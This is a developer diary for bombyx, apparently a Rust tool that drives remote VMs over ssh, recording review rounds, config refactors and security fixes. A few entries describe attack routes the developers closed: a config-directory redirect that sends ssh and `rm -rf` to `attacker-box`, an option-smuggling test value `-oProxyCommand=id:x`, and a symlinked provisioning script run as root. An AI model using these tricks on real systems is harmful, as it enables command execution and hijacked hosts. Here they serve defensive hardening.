# Development Diary

Development diary for bombyx. Newest entries first.

### 2026-09-04

**Three reviewers in sequence, and the worst finding was a
security claim we had written**

`/review2` on the overlay removal, run after the commit rather
than before it, so the reviewers read `HEAD~1..HEAD` instead of
an empty tree. 32 findings, 30 fixed, two sent to the backlog
and one declined.

The one worth remembering: the change's own prose said "bombyx
opens no file inside the project directory to find a host, so a
repository cannot name the machine your `destroy` runs `rm -rf`
on." The first clause is true and the inference is not.
`BOMBYX_CONFIG_HOME` decides which config directory bombyx
reads, `is_anchored_dir` only requires the value to be
anchored, and a per-directory environment tool -- `direnv` on an
`.envrc` in a clone, `mise`, a CI job -- sets it from inside the
checkout. The resulting origin is `UserFile`, which is exactly
the case bombyx stays silent about, so the redirect prints
nothing. Pointing the variable at a directory holding
`host = "attacker-box"` produced `ssh attacker-box` with a clean
stderr. `host.rs` had described this route in its own comment
for weeks; we wrote the contradicting sentence anyway. The prose
is corrected in four files and the code half is
`config-home-env-provenance` in the backlog.

Six findings came from one mechanical slip. The removal sweep
ran `grep -n 'Overlay\|...'`, case-sensitive, where the rule in
`CLAUDE.md` says `grep -rni`. Lowercase "overlay" was invisible,
so four stale comments survived in files the commit never
touched, plus a module table row and a doc claiming the project
config path does *not* refuse a symlink when it does.

Two tests were asserting less than their names promised.
`no_host_anywhere_names_every_way_to_set_one` checked two of the
three sources, missing the one this change could break. Worse,
the silence rule -- no provenance line means the host came from
a `config.toml` -- had no test at all: defeating the condition
on the print, rather than the print itself, left all thirty
green. Both now fail when broken, each watched to do so.

`fresh-reader` settled a question `red-team` had raised and
neither could answer by reading. `read.rs` justified refusing a
symlinked `bombyx.toml` by saying the parse error would echo a
line of the key, and `toml_summary` has not put a source line in
a message for some time. A `--config` pointed at a private-key-
shaped file prints `line 1, column 12: key with no value` and
nothing else. The refusal still earns its place, for a different
reason now written down: it is the precaution that stops the
file being opened at all, so a later change to the error path
cannot undo it.

Stage 2's stop rule fired for the first time since it was
written. No behaviour defect was found and fixed -- every fix
was a document, a record or a test -- so the stage ended after
one round instead of running to the three-round cap.

**bombyx.local.toml is gone, and with it the last host source
inside the checkout**

Step 2 of the config move (#23). The overlay file supplied a VM
host for one project, and it sat inside the project directory
with only a `.gitignore` line keeping it out of git. A
repository that committed one redirected every `ssh` bombyx
ran, `destroy` included, to a machine of its choosing. That is
the attack `host` was removed from `bombyx.toml` to prevent,
and removing it from that file left this route open. Four
red-team findings tracked it from different angles; all four
close here, and each carries a closing line in
`docs/developer/redteam-log.md`.

What went: the `Overlay` type, `local_config_path`,
`HostOrigin::Overlay`, the overlay branch of `resolve_host`,
and the two parameters that carried the file through
`resolve_host`. `host_places` lost the one parameter it
carried, and is now `host_place`. Host ranking is now
`--host`, `BOMBYX_HOST`, `config.toml` -- three sources, every
one of them outside the checkout.

We asked whether a leftover file should stop bombyx with a
message rather than being ignored, and chose ignoring it.
bombyx is pre-release, so the migration is one delete, and a
refusal would have kept a path helper and an error variant
alive for the five remaining steps to drag along. The cost is
that anyone relying on such a file gets their `config.toml`
host with no warning.

Deleting the overlay tests took the provenance line's coverage
with them. That line is the whole of what bombyx offers against
a redirected run, and after the deletion only the `--host` half
had a test -- `BOMBYX_HOST` could have stopped printing and the
suite would have stayed green. The assertion moved onto the env
test, and we confirmed it by disabling the `if` in `main.rs`
and watching it go red.

**canon-check could not see a rule whose bold heading wrapped**

Every markdown file here wraps at 80 columns, so a bold rule
longer than about 70 characters spans two lines. `canon-check`
read the files line by line, so it saw neither half: a correct
pointer at such a rule failed the gate with "names no heading",
and a pointer that wrapped was never checked at all. We found
it while writing `/review2`, which could not cite the rule it
meant and had to point somewhere vaguer.

`canon.rs` now joins each paragraph, list item and heading into
one `Block` and scans that, keeping the source line of every
piece so a finding still names a line somebody can open. A
heading is closed as a block of its own, so its text never runs
into the paragraph beneath it.

`/review2` then ran on the fix and found the fix's own worst
defect. Joining the lines made us read the bold lead at the
start of each block, and the code it replaced read it at the
start of each *line* -- so 19 rules that open a continuation
line, `CLAUDE.md`'s "In code comments the actor is usually the
program" among them, quietly stopped being citable. The gate
stayed green, because nothing cites them yet. `red-team` found
it by diffing the two target sets over the real canon files,
which is the check we did not think to run.

Two more from the same run. The pointer scan resumed past the
closing `**`, so an unclosed run swallowed the next pointer --
across a whole paragraph now, where before it cost the rest of
a line. And the Done entry we hand-wrote into `docs/todo.md`
was in a shape `cargo xtask todo`'s parser does not read, so
the item vanished from `todo list --done` and its slug looked
free to reuse. Both were invisible to every gate.

The stop rule in `/review2` ran for the first time and behaved.
Round one of the correctness stage found two behaviour defects
and earned round two; round two found a record, a comment and a
missing test, so the stage ended there rather than fishing for
a clean sheet.

One thing the run left behind: `fresh-reader`'s backlog now
holds 33 open entries, which is past the point where a backlog
is the problem rather than a record of one.

**`/review2` reviews one reviewer at a time, and reviewing
itself broke it**

`/review` spawns the three reviewers together, so a defect in
three places is reported three times and fixed once. On the
overlay removal the stale word "overrides" came back from all
three, and the duplicated test fixture from two. `/review2`
runs them in sequence instead: `artisan`, then `red-team`
looping while behaviour still moves, then `fresh-reader` on
prose alone. Each one reads the previous one's fixes, so a bad
fix is caught inside the run rather than a round later.

The order is by danger. `artisan` changes types, tests and
signatures; `red-team` changes logic; `fresh-reader` changes
only prose. The stage that finds danger runs after the stage
that creates most of it, and the stage that cannot break the
program runs last. Each stage also gets one lane, so the same
reviewer is not asked for everything it has.

Then we ran it against itself, and it broke on the first thing
it read. Fourteen defects, and the useful part is that they
were one mistake repeated: **we wrote the lanes as kinds of
file when they are kinds of defect.** "The source code" for
stage 1 and "the code" for stage 2 left canon belonging to
neither, so a canon change routed to the prose stage alone
while the correctness stage was told to ignore exactly the
findings `red-team` is best at. On the `/issue` review its
three most useful results were "this command file contradicts
itself", all labelled correctness, and the first draft would
have demoted every one to a wording note.

Three of the fourteen came from the walk, before any reviewer
was spawned -- for a workflow file `/review` defines the
artifact run as walking the file against the tree with nothing
spawned, and that is what it is for. `canon-check` passed on
the broken version, because a lane naming the wrong category
is not a heading, a path or a `git` subcommand.

`red-team` then found eleven more, five of them inside fixes
made minutes earlier. The sharpest was that the loop could
never iterate: a round was earned only by fixing a behaviour
defect, and a canon change cannot produce one, so stage 2 was
always exactly one round. That is the mirror of the stop
condition `bd52dcd` reverted the day before -- there only a
prose finding could satisfy it, here only a code finding
could. Same file family, inverted, one day apart.

The resolution was to scope the command rather than patch it:
`/review2` reviews changes containing source code, and a
prose-or-canon-only change goes to `/review`, which already
handles all three cases. That dissolved four of the six
root-cause findings and left three bounded ones, all fixed --
the findings-file paths are named, the snapshot is retaken
before every stage and round, and the file says which four
parts of `/review` it inherits and that the round-three rule is
not among them.

One reviewer conclusion we declined. `red-team` said the
justification for stage 2's lane was contradicted by the record
and that the lane needed re-arguing. The premise was half
right: the claim was true, but `target/review-2.findings` was
never written on the previous run, so it was unverifiable from
disk. The record was incomplete rather than contradictory, and
acting on the conclusion would have undone a correct decision.
Writing each stage's findings is mandatory in the new file for
that reason.

`canon-check` also has a real bug, found by using it. It
collects a bold heading as a reference target only when both
`**` land on one line, and every markdown file here wraps at 80
columns, so a valid pointer at a wrapped rule fails the gate
with "names no heading". Captured as `canon-xref-wrapped-bold`.

The stop rule has now been written twice and exercised never,
so the file says so and asks for findings against it to go to a
backlog until a code review measures it. That is the discipline
`/review` was held to the day before.

**`/issue` was wrong in ten places by the end of the day**

We wrote the command in the morning and found it wrong by
lunchtime. The step ordering came straight from mutrack, where
the review protocol lives inside the commit command and the
reviewers read a landed `HEAD`. Here `/review` snapshots
`git diff HEAD`, so running it after the commit hands the
reviewers an empty diff, and they would report a clean sheet on
a change nobody had read. Found by following the command on
#22, not by reading it.

The reviewers then found nine more, and the pattern in them is
worth keeping. Three were the ordering fix leaving residue: the
step-8 paragraph about a round after the PR reintroduced the
same empty-diff defect, the header asserted that a review
always happens while step 8 said the operator decides, and step
10 still told the reader not to hold the PR back until the
rounds finish, which now happens before any commit exists.
One fix, three places that had to move with it.

Two more were the frontmatter, which is executable rather than
documentation. `allowed-tools` never granted `Skill(todo)`
while two steps told the agent to use `/todo`, and step 1 told
it to re-measure a stale count "with the command that produces
them" while granting no `wc` or `grep`. `canon-check` cannot
catch either: its fourth check reads `git` subcommands only.
This is the defect the command's own step 5 warns about, in the
command that warns about it.

The rest were the file saying one thing three times, or telling
the reader to do something no step arranged. The ordering rule
was in the preamble, in step 8 and in the Rules list. Nothing
merged the PR, yet step 12 waited on a merge before closing the
issue -- and nothing moved the item in `docs/todo.md` to
`## Done` either, which is why completing #22 by hand left that
entry pending. Step 12 now says both are the operator's and
that the report has to name them.

The command shipped on `main` with all of this in it, because
the fixes and the config change it was written against ended up
on one branch and the reviewers spent 17 of 58 findings on
prose that had nothing to do with the config. Splitting it out
is what this branch is.

**`bombyx.local.toml` carries a host and nothing else**

This is step 1 of seven in moving the project config off the
repo, and it is the largest of them. `Overlay` had five fields
and now has one. Three more things went with the other four:
`Config::with_overlay`, the `replace` helper, and
`into_config`'s overlay parameter.

The reason to delete the overlay depends on the rest of the
move -- once the base config is the operator's own private
file, an overlay over a file only its owner can edit buys
nothing. The work does not depend on the move at all, which is
why it goes first. `bombyx.local.toml` still supplies a VM host
for one project, and step 2 is what deletes the file.

We also deleted the `bombyx: <local> overrides <config>` line
on stderr, which #22 did not ask for. With the overlay reduced
to a host, that line described something the file can no longer
do, and the host provenance line beneath it already names
`bombyx.local.toml` whenever that file wins. An empty overlay
file now prints nothing at all, which is the honest report: it
changed nothing.

Four unit tests described the merge and went with it. Writing
their replacement first was worth it: a project key in the
overlay is now an unknown field, and the test failed by
applying `project = "other"` before the fields came out.

One deleted test carried a guard that outlived it. It asserted
that a half-stated `[vm]` cannot parse, and the reason it gave
was that nothing enforces this except `Vm`'s fields all being
required -- a `#[serde(default)]` added later would turn a
partial table into a silent default. That risk belongs to the
project file, not the overlay, so the guard came back aimed at
`Config::parse` and enumerating all four fields one at a time.
Defaulting `memory` turns it red and the message names the
field.

Two doc comments in `config/host.rs` justified themselves by
naming `with_overlay`. `resolve_host` still takes the overlay
by `&mut` and empties the host it finds, and the reason it gave
was that this made `with_overlay` ignoring the field safe
rather than merely intended. The mechanism is worth keeping and
the sentence is not, so it now says that no later reader can
find a value two higher-precedence sources outrank.

Also found: `cargo xtask todo done` always writes the Done
entry as a link to `issues/<slug>.md`, and its comment says why
that is safe -- `/implement` is the only caller and writes that
document first. `/issue` is a second caller now, and an item
split out of a shared plan has no document of its own, so
completing this one wrote a link to a file that does not exist.
Captured as `todo-done-link` rather than fixed here.

**`/issue` works a GitHub issue end to end**

Ported from the mutrack project, where the same command was
written from the session that produced its issues #23 and #24.
The twelve steps go from reading the issue to reporting back on
it: verify the body against the tree, settle the approach,
branch, implement test-first, keep canon in step, verify, then
commit, open the PR, review, watch CI and comment the outcome.

Four things changed on the way in. The gates are
`cargo xtask validate` rather than mutrack's dispatcher, and the
npm bootstrap step is gone because bombyx has no `node_modules`
to fill. mutrack keeps its review protocol inside its commit
command, so its `/issue` restated the rounds; here `/review`
owns the loop and `code-reviewers.md` owns the reviewers, so
step 8 states only what is specific to working an issue and
points at them for the rest. That also drops mutrack's
two-round cap in favour of the three-round cap `/review`
already has. And step 6 adds Definition of Done item 3, a real
run against the VM host, which no gate can do.

The part worth keeping is step 1. In the mutrack session six of
eighteen issues had already been fixed before anyone started
them, so the command opens by treating the issue body as a
claim and checking every fact in it against the tree. bombyx
issues carry the same risk from a different direction: each one
cites a slug in `docs/todo.md` and usually a planning document
under `docs/issues/`, and the issue body is the summary of those
two, which is the copy that goes stale.

### 2026-09-03

**`/short` answers in forty words**

`/short` restates the reply above it, and `/short <instruction>`
carries out an instruction instead. Either way the answer fits
in what a reader gets through in ten seconds.

The budget is written down as forty words rather than as "be
brief", because ten seconds of silent reading comes to about
that and because a word count is a criterion a reader can
check. Today's review rounds spent three passes on findings
whose criterion nobody could settle, so a number was the
cheaper thing to write.

Two rules in the file matter more than the budget. Compression
never launders bad news: a reply reporting a failing test or an
unverified claim keeps that when it shrinks, because "nine gates
pass, coverage could not run" cut down to "gates pass" is a
false statement rather than a short one. And the first form
re-derives nothing -- the reply above is the whole input, so no
command gets re-run to confirm it.

The file carries no `allowed-tools` line on purpose: the first
form needs no tools, and the second needs whatever its
instruction turns out to need.

**The stop rule I added was wrong, and the reviewers said so**

The entry below claims that a severity-based stop condition
"would have ended the run a round earlier". Three reviewers then
read `4c8dab3` and the claim does not survive. Correcting it
here rather than editing the entry, because the diary is a
record.

The condition was redundant. Step 3 already said to fix what is
wrong, false, or would mislead a reader into an error -- that is
the severity test, in the file, at the step where fixing
happens. The new condition restated it in step 4, one step
downstream, which is the defect `/review` already writes down
for the round-three rule: a rule about not fixing is no use
after the fixing.

It was also mis-scoped. The test read "would make a reader act
wrongly", and most of what this loop guards is not prose. A
config value interpolated into Ruby without quoting misleads no
reader and still hands the VM host a command nobody wrote. On a
literal read such a finding scored zero.

Two worse problems. The commit deleted "the stopping rule is
agreement on what matters" from `CLAUDE.md`, which removed the
developer from the stop decision and left the condition
certifiable by the actor who would otherwise have to keep
working. And placing it first meant a round where earlier fixes
were breaking would end as an ordinary stop, so the
non-convergence diagnosis never ran -- and the findings cited as
proof that severity collapsed were themselves pointer defects
from a consolidation, which is the category that diagnosis
exists to name.

The evidence was wrong too. `d1908d6`, made from the same
round-three findings two hours earlier, records 18 of them still
live, among them two code defects and a false claim in two
reviewer briefs. That is not a collapse to nothing, and applying
the rule at round two would have discarded them.

So the condition is reverted, "agreement on what matters" is
back, and step 3's existing bar now names the three actors who
could act wrongly: a reader, the operator, or bombyx. The other
three changes from `4c8dab3` stay, with the defects the
reviewers found in them repaired -- the findings file writes
where it acts and records the finding rather than its label, the
copy threshold states its number in the rule that owns it, and a
consolidation is escalated instead of applied, because `/review`
commits nothing and has no change of its own to put one in.

`/review` is frozen until a run against a real code diff has
exercised it. The stop rule was edited four times in two days
and none of those edits was reviewed before landing. This one
was, which is the only reason any of the above is known.

**Three changes to `/review` so a round can actually finish**

The review loop had a stopping rule that could not fire, a
consolidation rule that manufactured its own next round, and a
handover that depended on the conversation surviving. All three
came out of the rounds on `abee0a5`.

`/review` used to stop when a round fixed nothing, and treated
a falling finding count as evidence of progress. It is not:
style and placement findings arrive in proportion to how much
prose there is, not to how wrong it is, so the supply never
runs out. The rounds went 45, 32, 31 while severity collapsed
from "this brief names a caller that does not exist" to "this
paragraph is called a section". The rule now asks whether any
finding would make a reader act wrongly, and that question
would have ended the run a round earlier.

The duplication rule said to consolidate above two copies,
while `artisan.md` listed a rule stated in two files as a
defect. With the threshold unsettled, any consolidation could
be filed as insufficient or excessive, so the finding came back
every round. Both files now say the same thing, and both name
the exception: a frontmatter `description` and a skills-table
row are how a reader finds a command, not copies of a rule.

Consolidating is now its own change with nothing else in it.
Collapsing N copies converts prose rather than removing it --
N-1 pointers appear, and a pointer can name the wrong section,
fail to name one, chain two deep, or explain that it is a
pointer. We did one 4-to-1 collapse inside a round carrying
twenty-five other edits and the next round filed five findings
against it. A backlog entry had said to do it as its own change
and we deleted that entry in the same round we ignored it.

Step 1 wrote the diff and the file list and nothing wrote the
findings, while step 3 from round two on needs the earlier
rounds' findings and their dispositions. In practice that ran
off the transcript, which is exactly what the snapshot exists
to avoid depending on -- a compaction between rounds would have
destroyed the only input to the one check that has ever caught
non-convergence here. Each round now writes
`target/review-<n>.findings` beside its snapshot.

**`canon-check`: the decidable half of a canon review is now a
gate**

`cargo xtask canon-check` reads the markdown in `.claude/`,
`CLAUDE.md` and `llms.txt` and fails on five kinds of claim the
tree does not support. It runs as validate gate 3, ahead of
every gate that needs a compiler, because it only reads files.

The reason it exists is in the entry above: 19 of the last
review round's 31 findings were decidable by a command, and
they recurred because a reader catches most of them and never
all. On its first run against the tree it found a defect nine
reviewer reports had missed -- `/commit` told the agent to run
`git tag` and granted no `git tag`, so the skill would stall on
a permission prompt while working out a version bump. The
instruction is now `git tag --list` with a matching narrow
grant, the way `10bc64c` narrowed `git config` to `--get`.

Two carve-outs are worth knowing, because both looked like
defects at first. A `git` command inside a double-quoted span
is a line the skill prints for the operator rather than one it
runs. And a file that says in prose it has ``no `git <sub>`
grant`` has declared the omission deliberate, which is how
`/commit` keeps telling the developer to run `git reset`
without the skill acquiring that power. Placeholder paths such
as `docs/issues/<slug>.md` are skipped for the same reason a
glob is: they describe a shape, not a file.

The check decides nothing about phrasing, and it must stay that
way. `/review` already says an assertion with no stable answer
should be deleted rather than parsed harder, and that is the
line between what belongs here and what belongs to a reviewer.

Adding a tenth gate meant the count moved, and it was written
in four places. `CLAUDE.md` under Definition of Done now owns
the enumerated list, and `llms.txt`, the architect skill and
`/implement` no longer state a number at all. A test in
`validate.rs` already asserted the documented gate order and
caught the insertion, which is the guard working as intended.

**Three review rounds on `abee0a5`, and why they did not
converge**

We reviewed `abee0a5` over three rounds. The findings went 45,
32, 31, and the flat tail is the shape `/review` says means a
run has stopped converging. The rounds fixed real defects --
all three reviewers independently found that the agent files
still named `/commit` as a caller after it stopped reviewing --
but rounds two and three kept finding defects in round one's
own fixes.

The cause is not that the fixes were careless, though some were
ours to own: we consolidated four copies of one rule inside a
round carrying twenty-five other edits, and the backlog entry
we deleted in that same round had said to do it as its own
change.

Two structural reasons sit under that. The first is that
collapsing duplicated prose is not a removal, it is a
conversion: N copies become one owner and N-1 pointers, and a
pointer can be misnamed, under-qualified, chained too deep, or
self-refuting. One 4-to-1 consolidation in round one produced
five findings in round two. The rule the reviewers enforce
manufactures the next round's input.

The second is that the finding count measures the wrong thing.
We classified round three's 31 findings and 19 of them were
mechanically checkable -- does this bold cross-reference
resolve, does this backticked path exist, is this `git`
subcommand in the skill's `allowed-tools`. Those recur because
detection is probabilistic rather than because they are hard:
the same defect class produced "`/commit` in three of three
agent files", then "the calling skill in two of three", then a
test asserting four of eight `NEVER_SYNC` entries. A grep is
not lossy and no grep was running. The other 11 were phrasing
and placement, and `review.md` already explains why those
cannot terminate -- it says an assertion with no contract
behind it should be deleted rather than parsed harder, a lesson
we learned about tests that scan documents and never applied to
reviewers that scan prose.

So the count was flat while severity collapsed. Round one found
a brief describing a caller that did not exist; round three
found a paragraph called a section.

`xtask/src/sync.rs` carried the one code defect of the run:
`NEVER_SYNC` listed two reviewer backlogs and not the third, so
`cargo xtask sync-candidates` would offer `fresh-reader-log.md`
as a template sync candidate. It now matches
`docs/developer/*-log.md` by shape, so a fourth reviewer
persona needs no edit there, and `is_excluded` grew a `*`
branch to support it.

**Reviewing and committing are separate processes now**

`/commit` used to commit and then run three reviewer agents,
fix what they found in a second commit, review that, and repeat.
Reviewing is now `/review`, an independent command that reviews
uncommitted work and commits nothing. Neither calls the other,
and nothing requires a review.

The reason to split them is what the old arrangement cost. A
save-point should be cheap, and it was not: every `/commit`
became a multi-round session, fixes needed their own commits,
the reviewers fired again on each, and there was no way to
record a checkpoint without inviting the whole cycle. On this
branch that produced eleven commits for one change, seven of
them named after review rounds.

`CLAUDE.md` argued the old order in three parts, and two of them
were about fix commits: the history shows what was found, and
the fixes get reviewed too. Both dissolve when there are no fix
commits. The third survives and `/review` still depends on it --
the reviewers need a target that does not move while they read,
which is why `/review` writes the working diff to a file and
points them at that rather than at the tree.

`/commit` went from 398 lines to 196. `code-reviewers.md` lost
its caller split and the commit-range machinery. `/review` grew,
because the backlog format, the escalation thresholds and the
last-round rule all lived in `/commit` step 9 and 10 and had
nowhere else to go.

Definition of Done says nothing about `/review`, at the
operator's direction. Reviewing is a tool now, not a gate.

**Four review rounds spent fighting our own test scaffolding**

`crates/bombyx/tests/integration_test.rs` was rewritten in seven
consecutive commits. The last four of those rewrote the same
twenty lines, and each round's reviewers found defects in the
code written to fix the previous round's defects there.

The tests were three document scanners. They ran the binary,
string-split its output, string-split a markdown file, and
compared. One checked that the sample configs the docs show
actually load. One checked the `(N lines elided)` numbers in the
dry-run transcripts. One checked that a `doctor` transcript
showing skip rows also shows the skip count.

The file list went hardcoded, then `git ls-files`, then a
directory walk -- each shape with a hole the next round found.
The count assertion went `contains` to vector equality, which
fixed one failure mode and created another. A helper returned
`None` on failure, which hid a broken extraction; making it a
hard failure then broke on a document that merely mentions the
anchor in prose.

The reviewers were right every time, and the fixes were right
every time, and it never converged. What none of us said until
round four is that rendered terminal output and hand-written
markdown have no contract to test against, so every assertion
was a fresh parser with fresh edge cases.

They are deleted. 251 lines, about a quarter of the integration
suite. Over four rounds they caught two defects: sample configs
that could not load, which was real and user-facing, and a stale
line count, which was cosmetic. The first was worth having. It
did not need a scanner -- it needed somebody to copy the sample
and run it, once, which is what the review round that found it
actually did.

The rule worth keeping: a test whose assertion side needs its
own parser is testing the parser. bombyx is the parser for a
config file, so "does this text load" was sound. Nothing is the
parser for a `doctor` report, so "does this transcript look
right" could not be.

`CLAUDE.md` caps the review cycle at three rounds and says to
hand what is left to the operator. We ran four. The cap is not
about patience; it is the point where the round stops finding
defects in the work and starts finding them in the previous
round.

### 2026-09-02

**The documented config never worked**

Three files show a reader what a `bombyx.toml` looks like:
`README.md`, `docs/tutorial.md` and `bombyx.toml.sample`. All
three put `remote_root` after the `[source]` table. TOML binds a
bare key to the table above it, so it parsed as
`source.remote_root`, and bombyx refused the file. Copy the
tutorial's block, run any command, get an error naming a field
you did not write.

We did not notice, because we never copy our own sample. We
write the config by hand, and by habit we put the scalars first.
We tested the tutorial by reading it.

`CLAUDE.md` already has the rule this needed -- "a rule stated in
prose needs a test using the same example" -- written after three
files disagreed with the code about a filename. We applied it to
that one transformation and never generalized it. An
integration test now extracts the block from each document and
loads it, so the samples cannot drift from the parser again.

**`doctor` failed a project for a plugin it does not use.**
`doctor` sent the `vagrant-libvirt` probe whatever the project's
provider was, and Hyper-V ships inside Vagrant with no plugin to
find. This is the second instance in one day: the `tar` row did
the same thing, and the fix for it added a sentence claiming the
class was gone. Writing "a red report always means `up` is in
trouble" is the kind of claim that should prompt checking every
row before it ships.

The first draft of that fix said the row failed "on a host where
every VM command worked". We have never run bombyx against a
Hyper-V host -- `config::vm` says so in as many words -- so that
sentence described an observation nobody made. The argument for
the fix never needed it.

Dropping the row turned out to be wrong on its own. A review
pointed out that bombyx never passes `--provider` to vagrant and
the generated Vagrantfile only *configures* a provider, so a
Hyper-V project on a libvirt host boots a libvirt machine at
vagrant's default size. The libvirt probe was catching that by
accident, for the wrong reason. The row is now a `skip` naming
what was not checked, and the real defect is captured as
`provider-configured-not-selected`.

**`--help` was wrong about losing work, twice over.** It said
`provision` runs the script "from the fresh clone", which tells
an operator their uncommitted work in the VM is gone. The
bootstrap fetches into the existing clone and deliberately skips
`git clean`, so untracked files survive -- but `checkout --force`
does overwrite edits to tracked files. Both the old wording and
the replacement were wrong, in opposite directions, and the
accurate statement is narrower than either.

**Two commit messages in this cycle claimed fixes that had not
landed.** One said `bombyx --help` was corrected when the edit
had gone to the wrong enum of two with near-identical doc
comments. The other said a claim was scoped in the architect
skill when it was scoped in two of six places, not including
that one. Both were caught by a reviewer reading the message
against the diff, which is an argument for the reviewers seeing
the message and not only the code.

**The push was dead for two weeks and nobody noticed**

`bombyx up` built a tar archive of the project's `vagrant/`
directory, copied it to the VM host and unpacked it there. Then
it wrote the generated Vagrantfile and bootstrap script over the
top, and booted. The generated Vagrantfile disables Vagrant's
default `/vagrant` share, so the guest never mounted any of it,
and its only `path:` names bombyx's own bootstrap script.

So the archive landed on the VM host and no program there read
it. That has been true since `generate-vagrantfile` disabled the
share, and we did not see it. The plan we wrote for
`project-config-off-repo` says the config move has to come
first, because `vagrant_dir` is how bombyx is told where the
project is. Reading the code to write that plan is what turned
up the opposite: the push had no consumer, and removing it takes
`vagrant_dir` with it.

Worth naming as a shape. A change that removes the *reader* of
something leaves the writer standing, compiling and tested. The
tests kept passing because they asserted the argv, and the argv
was still correct -- it was just pointless. Nothing in a test
suite asks "does anyone consume this".

**Four checks outlived what they checked.** `doctor` probed the
VM host for `tar` and `scp`, checked `scp` locally, and reported
on the project's `Vagrantfile`. All four existed for the push.
`guards::check_project_relative` existed for `vagrant_dir` and
had no other caller. Removing a capability leaves this debris
everywhere, and the compiler finds only the part written in
Rust: the rest is prose. `README.md`, `docs/usage.md` and
`docs/tutorial.md` between them described the push twenty-five
times, including a "How the push works" section and two `doctor`
transcripts showing rows that no longer print.

**A message that named the wrong program.** `host`'s refusal
said the value "must not start with `-`, which ssh and scp would
treat as an option". bombyx runs no `scp` now. That message
exists to tell the operator which program the value reaches, so
naming a program bombyx never invokes is not a stale comment, it
is a wrong answer to the question the message was written to
answer.

**Deleting a test can uncover a gap somewhere else.** The
integration test that ran a real `doctor` was the only thing
exercising `ProbeResult::from_output`, and dropping it took
`doctor.rs` to 65% and failed the coverage gate. The function
had never had a test of its own; it had a passenger.

`docs/trust-boundary.md` gets half of its first statement: the
VM host now holds no project code. Only half, and the first
draft of this change claimed the whole thing -- all three
reviewers caught it. The workstation still holds a checkout,
because `bombyx.toml` is read from the working directory, and
removing the push did nothing about that. The deferred finding
saying exactly this was sitting in `fresh-reader-log.md` while
the document was edited to assert the opposite, which is the
part worth remembering: a claim that flatters the work you just
did is the one to check hardest.

**Not run against a real VM host.** This changes what executes
there, so the argv is all we have proven. frosti was unreachable
from the session.

**Primitive obsession: why `box`, `ref` and four `Config`
fields should not stay `String`**

The operator stated a standard: prefer strong types, avoid
primitive obsession. We had written and defended one argument
in three places, and that standard shows it is wrong.

`docs/architecture.md` and two doc comments said `box`, `ref`
and the four `Config` fields stay `String` because
"their rules are the generic ones any string field would need,
so a type would promise nothing extra."

The mistake is in the last clause. What a type promises is not
that its rules are interesting. It promises that they *ran*.
`Config`, `Vm` and `Source` all have public fields, so any code
can build one by hand and reach the guest with no check at all,
and that is as true of a field with dull rules as of one with
sharp rules.

Eight checked values are still bare, and all three places now
say so as a gap rather than a decision. `remote_root` is the one to
do first: it reaches `rm -rf`, and `config::root` already holds
all of its rules in a single function, so the constructor would
wrap something that exists.
Captured as `newtype-remaining-config-fields`.

Not done in the same PR. The config modules had been re-cut in
four commits over two days and the review had already flagged
the churn.

### 2026-08-31

**A review round where the comments were the defect**

Two reviewers ran against the newtype diff and returned
twenty-two findings, two of them reached independently by both.
Nine were not about the code at all. They were about comments
written *in that same diff* describing behaviour the code did
not have.

That is worth naming as a pattern rather than a run of bad
luck. The diff had just rewritten every comment to explain more
for a junior reader. Explaining more means asserting more, and
each assertion is a thing that can be wrong. A guard that
cannot fire, a rule described one way and implemented another,
a shell line credited with a fix it does not deliver.

The worst one was that last shape. `bootstrap.sh` re-points
`origin` before fetching, and the comment said this stops the
silent-wrong-answer case where a changed `repo` leaves you
looking at the old code. It does not. A fetch updates the files
the new repository has; it does not delete files only the old
one had. So the clone becomes a mixture, and if the old repo
carried a provisioning script where the new one does not, the
guest runs the *old* repository's script, as root, and reports
success. The fix removes the clone outright when the remote
disagrees.

Second: `chmod` and `exec` follow symlinks. Checking the config
value said nothing about what the repository put at that path,
so a repo could ship its provisioning script as a link to a
system file and have the guest `chmod +x` it as root. The path
is resolved with `readlink -f` now and refused if it lands
outside the clone. Resolving the whole path matters -- a
symlinked parent directory does the same job and a single-link
check misses it. Verified against a four-case harness.

Two of the fixes then had to be corrected by testing them,
which is the part worth remembering.

A reviewer suggested `git clean -xdff` after the checkout so
the tree matches the repository. It would also delete every
untracked and ignored file -- which in an agent VM is the
agent's uncommitted work. `bombyx provision` silently
destroying that is worse than carrying a stale file. Not added,
and the reasoning is in the script so nobody re-adds it.

And the test pinning the leading-dash rule was written on a
wrong assumption. I expected the dash-shaped values to be
refused by the URL check; they are not, because
`check_not_an_option` runs first. The test failed and said so.
The value that actually pins the rule is
`-oProxyCommand=id:x`: one colon, no `://`, so the URL check
reads it as SSH shorthand and accepts it outright.

One reviewer suggestion did not survive contact either.
Replacing a "see below" with a rustdoc link to
`delimiter_for` fails the doc gate, because the gate runs
rustdoc twice and the public pass refuses a public item linking
a private one. Tested rather than argued.

**A third copy of the same rule**

Acting on the deferred design findings turned up something
neither reviewer did. One of them said the leading-dash rule
existed twice -- once as a function in `config/vm.rs`, once
hand-inlined in `Config::validate` -- so unifying them meant
finding both. Grepping afterwards to check the job was done
found a third, in `config/host.rs`.

We left that one duplicated, with a comment saying to widen
both, and the comment gave a reason that turned out to be
wrong. It said the shared guard returns a `FieldError` carrying
only a field name, while a bad host has to name the *source* it
came from -- a flag, an environment variable, or one of two
files -- so routing `host` through the guard would lose that.
Two reviewers checked the claim in the next round and both
found it false. `FieldError::Invalid` carries a reason string,
and `Config::load` attaches the source itself, so nothing is
lost. The third copy is gone now, and `host_problem` calls the
three shared guards.

The duplicate had already drifted before anyone noticed, which
is the argument the comment should have made against itself.
Parameterising the message for `git` singularised its verb, so
the `ssh and scp` caller emitted "which ssh and scp reads as an
option" while `host.rs` still said "read". The wording is
"would treat" now, which works with one subject or two, and a
test asserts the whole sentence rather than a fragment -- a
`contains` check steps straight over a broken verb.

Two lessons, and neither is about the dash rule. "Unify the
duplication" needs the same treatment as any other guard: grep
for the shape after fixing it, because the reviewer who found
two copies had no reason to believe there was a third. And a
comment explaining why a duplicate stays is a claim about the
code, so it gets checked like one -- this one was one
three-line conversion away from being disproved, and stood for
a day.

**Splitting the config, and what the split found**

`config.rs` was 2,076 lines and `config/vm.rs` was 697, so a
reviewer asked for a split. Four seams turned out to be
obvious once we looked: reading a file off disk (`read`), the
`remote_root` rules (`root`), the `[source]` table with its two
checked types (`source`), and the Ruby-literal guard, which
four fields share and which therefore belongs in `guards` with
the other shared rules. `config.rs` came out at 1,806 lines and
`vm.rs` at 202.

Moving code is the cheapest way to find things wrong with it,
and this move found two.

The doc comment on the `minimal()` test helper existed *twice*,
